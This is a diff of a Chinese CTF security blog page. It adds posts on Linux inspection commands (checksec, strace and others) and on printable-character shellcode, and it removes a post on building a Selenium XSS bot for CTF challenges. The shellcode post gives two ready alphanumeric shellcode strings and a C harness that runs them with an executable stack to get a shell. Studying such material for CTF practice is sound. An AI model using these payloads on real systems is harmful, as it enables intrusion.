@@ -333,6 +333,318 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/shell命令解析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/30/shell命令解析/" itemprop="url">shell命令解析</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-30T16:14:22+08:00">
+                2017-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>此标题范围广，内容多，不易梳理清楚。本人也因为能力有限，不可能面面俱到，只能讲讲在ctf中可能会遇到的一些命令。</p>
+<h3 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1. checksec"></a>1. checksec</h3><p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ checksec tiny_easy</div><div class="line">[*] &apos;/tmp/tiny_easy&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
+<h3 id="2-ldd"><a href="#2-ldd" class="headerlink" title="2. ldd"></a>2. ldd</h3><p>用来查看程序运行所需的共享库,常用来解决程序因缺少某个库文件而不能运行的一些问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ldd ascii_easy</div><div class="line">	linux-gate.so.1 =&gt;  (0xf7765000)</div><div class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7591000)</div><div class="line">	/lib/ld-linux.so.2 (0x56565000)</div></pre></td></tr></table></figure>
+<h3 id="3-export"><a href="#3-export" class="headerlink" title="3. export"></a>3. export</h3><p>设置全局变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ export PATH=/tmp/test:$PATH</div><div class="line">$ echo $PATH      # 输出某个全局变量，没有的话就输出一行空串</div><div class="line">$ env     # 查看所有全局变量</div><div class="line">$ set     # 显示所有本地定义的Shell变量</div><div class="line">$ unset PATH     # 清除环境变量</div></pre></td></tr></table></figure>
+<p>export是设置的临时全局变量，在关闭shell之后就自动清除了；</p>
+<p>而如果修改文件/etc/bashrc和/etc/profile，那这个改变就会是永久的。</p>
+<h3 id="4-ldconfig"><a href="#4-ldconfig" class="headerlink" title="4. ldconfig"></a>4. ldconfig</h3><p>ldconfig是一个动态链接库管理命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ export LD_LIBRARY_PATH=/tmp/test</div><div class="line">$ ldconfig</div><div class="line">$ ldd ascii_easy</div></pre></td></tr></table></figure>
+<p>最后没有正确链接上，可能的原因是因为本机与那个动态链接库不兼容导致！</p>
+<h3 id="5-strace"><a href="#5-strace" class="headerlink" title="5. strace"></a>5. strace</h3><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">-c 统计每一系统调用的所执行的时间,次数和出错的次数等. </div><div class="line">-d 输出strace关于标准错误的调试信息. </div><div class="line">-f 跟踪由fork调用所产生的子进程. </div><div class="line">-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. </div><div class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. </div><div class="line">-h 输出简要的帮助信息. </div><div class="line">-i 输出系统调用的入口指针. </div><div class="line">-q 禁止输出关于脱离的消息. </div><div class="line">-r 打印出相对时间关于,,每一个系统调用. </div><div class="line">-t 在输出中的每一行前加上时间信息. </div><div class="line">-tt 在输出中的每一行前加上时间信息,微秒级. </div><div class="line">-ttt 微秒级输出,以秒了表示时间. </div><div class="line">-T 显示每一调用所耗的时间. </div><div class="line">-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. </div><div class="line">-V 输出strace的版本信息. </div><div class="line">-x 以十六进制形式输出非标准字符串 </div><div class="line">-xx 所有字符串以十六进制形式输出. </div><div class="line">-a column  设置返回值的输出位置.默认 为40. </div><div class="line">-e expr 指定一个表达式,用来控制如何跟踪.格式如下: </div><div class="line">[qualifier=][!]value1[,value2]...  qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如: </div><div class="line">-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\. </div><div class="line">-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all. </div><div class="line">-e trace=file 只跟踪有关文件操作的系统调用. </div><div class="line">-e trace=process 只跟踪有关进程控制的系统调用. </div><div class="line">-e trace=network 跟踪与网络有关的所有系统调用. </div><div class="line">-e strace=signal 跟踪所有与系统信号有关的 系统调用 </div><div class="line">-e trace=ipc 跟踪所有与进程通讯有关的系统调用 </div><div class="line">-e abbrev=set 设定 strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all. </div><div class="line">-e raw=set 将指 定的系统调用的参数以十六进制显示. </div><div class="line">-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号. </div><div class="line">-e read=set 输出从指定文件中读出 的数据.例如: </div><div class="line">-e read=3,5 -e write=set 输出写入到指定文件中的数据. </div><div class="line">-o filename 将strace的输出写入文件filename </div><div class="line">-p pid 跟踪指定的进程pid. </div><div class="line">-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出. </div><div class="line">-u username 以username 的UID和GID执行被跟踪的命令</div></pre></td></tr></table></figure>
+<p>strace -if elfname   一般而言会返回   execve(elf绝对路径， elf绝对路径，其他)</p>
+<p>但是，如果elf所在目录被加入PATH全局变量，返回的就是  execve(elf绝对路径， elfname，其他)</p>
+<p>也就是说，后一种直接用文件名就可执行！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/全是可见字符的shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/30/全是可见字符的shellcode/" itemprop="url">全是可见字符的shellcode</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-30T12:19:10+08:00">
+                2017-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近做了pwnable.kr上的一道题，收获颇丰！其中就有对全是可见字符组成的shellcode的总结，也就是本文。</p>
+<h3 id="全是可见字符的shellcode"><a href="#全是可见字符的shellcode" class="headerlink" title="全是可见字符的shellcode"></a>全是可见字符的shellcode</h3><blockquote>
+<p>shellcode1: PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx</p>
+<p>shellcode2: PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA</p>
+</blockquote>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>首先写一个test.c文件:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">//    char shellcode[] = "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx";</span></div><div class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA"</span>;</div><div class="line">    (*(<span class="keyword">void</span> (*)())shellcode)();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>关闭NX保护:</p>
+<blockquote>
+<p>gcc -z execstack -o test test.c</p>
+</blockquote>
+<p>运行之后获得shell</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://inaz2.hatenablog.com/entry/2014/07/11/004655" target="_blank" rel="external">http://inaz2.hatenablog.com/entry/2014/07/11/004655</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/linux程序的常用保护机制/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1865,376 +2177,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/xss-bot介绍/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/xss-bot介绍/" itemprop="url">xss bot介绍</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T17:22:02+08:00">
-                2017-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这篇文章摘抄与LoRexxar的的博客<a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
-<p>bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。</p>
-<p>因此xss bot应该具有较强的稳定性！</p>
-<p>xss在近几年的ctf形式中，越来越受到了人们的重视，但是出xss的题目最重要的可能就是xss bot的问题了，一个合格的xss bot要稳定还能避免搅屎。</p>
-<p>下面我们就来看看一个xss bot是怎么完成的。</p>
-<h1 id="bot之前"><a href="#bot之前" class="headerlink" title="bot之前"></a>bot之前</h1><p>一般来说，对于xss bot来说，最重要的是要bot能够执行js，事情的本质是我们需要一个浏览器内核来解析js，这里我们一般会用<code>selenium+webdriver</code>。</p>
-<p>而webdriver一般有3种chrome webdriver、firefox webdriver、phantomjs。</p>
-<h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>selenium是用来控制webdriver的接口的，网上搜到的大部分脚本大部门都是java控制的，下面我的所有脚本都使用python操作selenium，下面有份不太完整的文档。</p>
-<p><a href="http://www.seleniumhq.org/docs/03_webdriver.jsp" target="_blank" rel="external">http://www.seleniumhq.org/docs/03_webdriver.jsp</a></p>
-<p>只要在python文件前引入selenium模块。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div></pre></td></tr></table></figure>
-<h2 id="chrome-webdriver"><a href="#chrome-webdriver" class="headerlink" title="chrome webdriver"></a>chrome webdriver</h2><p>如果我们想要使用chrome webdriver，除了安装chrome浏览器本身，还需要安装webdriver。</p>
-<p><a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="external">https://sites.google.com/a/chromium.org/chromedriver/downloads</a></p>
-<p>由于webdriver版本众多，api和语法也有所不同，这里推荐最新版chrome+最新版webdriver。</p>
-<p>因为环境相异，所以我们可能需要在脚本里设置chrome webdriver的路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line">import os </div><div class="line"></div><div class="line">chromedriver = &quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe&quot;  </div><div class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver  </div><div class="line">browser = webdriver.Chrome(chromedriver)  </div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h2 id="firefox-webdriver"><a href="#firefox-webdriver" class="headerlink" title="firefox webdriver"></a>firefox webdriver</h2><p>firefox和chrome相同，需要一个geckodriver来支持，和chrome类似。</p>
-<p><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="external">https://github.com/mozilla/geckodriver/releases/</a></p>
-<p>在linux下，需要添加映射到/bin/</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x geckodriver</div></pre></td></tr></table></figure>
-<p>在windows下，需要添加geckodriver到环境变量中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">browser = webdriver.Firefox()</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h2 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h2><p>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持，而且不需要浏览器支持，所以一般爬虫用的比较多。</p>
-<p>下载地址<br><a href="http://phantomjs.org/download.html" target="_blank" rel="external">http://phantomjs.org/download.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver</div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">phantomjs_path = &quot;sssssssss/phantomjs&quot;</div><div class="line">driver = webdriver.PhantomJS(executable_path=phantomjs_path)</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
-<h1 id="bot的背后"><a href="#bot的背后" class="headerlink" title="bot的背后"></a>bot的背后</h1><p>比起爬虫来不一样，因为一个爬虫只要打开一次获取数据就好了，但是作为xss bot必须周期性的打开页面，执行攻击者的相应payload，既然bot的持续时间一般是24小时-48小时，那bot就不可能时时刻刻都有人盯着，也就必须放在服务器上，我们来研究一下不同的webdriver在服务器的差异。</p>
-<p>chrome和firefox的webdriver都有一个特点，就是需要桌面，如果执行脚本的服务器上不包含桌面，那么我就需要别的方法来构造一个虚拟的桌面。</p>
-<p>如果在windows服务器上，windows服务器最大的特点就是自带桌面，我们一般通过rdp管理，所以windows服务器上跑xss bot的话不需要做专门的处理。</p>
-<p>如果在linux服务器上，我们一般通过ssh管理linux服务器，那么我就需要一段神秘代码来执行xss bot脚本，这是一段火日聚聚教我的代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from pyvirtualdisplay import Display</div><div class="line"></div><div class="line">display = Display(visible=0, size=(800,800))</div><div class="line">display.start()</div></pre></td></tr></table></figure>
-<p>在phantomjs的webdriver下，就不会有这样的问题，因为phantomjs本身就是多平台的，只是很多时候xss bot需要保证浏览器的特性，这种时候，我们往往不会使用phantomjs作为xss bot的首选。</p>
-<h1 id="完成bot"><a href="#完成bot" class="headerlink" title="完成bot"></a>完成bot</h1><p>上面我们着重讲了各种webdriver，下面我就来针对不同的xss题目来谈谈。</p>
-<h2 id="report-bug型xss"><a href="#report-bug型xss" class="headerlink" title="report bug型xss"></a>report bug型xss</h2><p>一般来说，xss题目最常见的就是report bug或者是留言型xss，后台接口唯一，攻击者向目标发送信息，bot需要访问页面执行js。</p>
-<p>在ctf比赛中，处理方式五花八门，这里我推荐1种解决办法。</p>
-<p>在攻击者页面提供测试接口和攻击接口，然后攻击者接口设置验证码，避免攻击者无意义的刷payload。（具体可以见0ctf的处理方式）</p>
-<p>为了避免干扰，最好将攻击者攻击数据存入数据库，添加标志位以判断数据是否被访问过，题目专门添加功能用作check数据库内是否存在未访问数据（最好添加此功能在题目中，因为bot有可能不在题目服务器，远程数据库连接是个危险的行为！！）</p>
-<p>判断存在时，bot开启webdriver访问相应的页面（通过添加cookie或者ip check的方式判断访问来源），相应的页面从数据库取出数据，bot访问完成后关闭。</p>
-<p>大致流程如下：</p>
-<p><img src="/images/2017-09-21/image_1bepoa4nsjb91ipsli170tclt9.png" alt="image_1bepoa4nsjb91ipsli170tclt9.png-31.8kB"></p>
-<p>我这里贴上bot部分的代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = requests.Session()</div><div class="line">		url = <span class="string">'http://xxx/checksql.php'</span></div><div class="line">		r = s.get(url)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"存在"</span> <span class="keyword">in</span> r.text:</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				chromedriver = <span class="string">"C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe"</span>  </div><div class="line">				os.environ[<span class="string">"webdriver.chrome.driver"</span>] = chromedriver  </div><div class="line">				browser = webdriver.Chrome(chromedriver) </div><div class="line">				</div><div class="line">				browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">				browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">				url = <span class="string">"http://xxxxxx/admin_321321321.php"</span>  	</div><div class="line">				browser.get(url)</div><div class="line">				browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">				 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">				 <span class="string">'path'</span> : <span class="string">'/'</span>&#125;)</div><div class="line"></div><div class="line"></div><div class="line">				browser.get(url)</div><div class="line">				<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">					<span class="keyword">try</span>:</div><div class="line">						browser.switch_to_alert().accept()</div><div class="line">					<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">						<span class="keyword">break</span></div><div class="line">				<span class="keyword">print</span> browser.title</div><div class="line">				<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">				time.sleep(<span class="number">10</span>)</div><div class="line">				browser.quit()</div><div class="line">				time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">				<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div><div class="line">				browser.quit()</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">			<span class="keyword">print</span> <span class="string">"[info] no unread messages"</span></div><div class="line">			exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div></pre></td></tr></table></figure>
-<p>上面的代码配合crontab应该可以很好的应付这类xss的各种问题</p>
-<h2 id="聊天类的交互式xss"><a href="#聊天类的交互式xss" class="headerlink" title="聊天类的交互式xss"></a>聊天类的交互式xss</h2><p>这类xss最明显的特点就是admin用户和别的用户并没有区别，也就是说bot想要打开被攻击者注入的页面，也必须经过登录，服务端设置session来登录，那么上面的办法就行不通了，最好的办法就是模拟登录。</p>
-<p>这类xss最大的问题其实就是信息的隔离方式，如果聊天的交互方式本身就是显示在同一页面上的话，很显然的问题就是，如果有一个攻击者试图干扰bot的运行，他只要再每个round发送<code>&lt;xmp&gt;</code>就可以导致js无法执行，这是个我到现在还没想明白的问题。先分享现在我使用的bot</p>
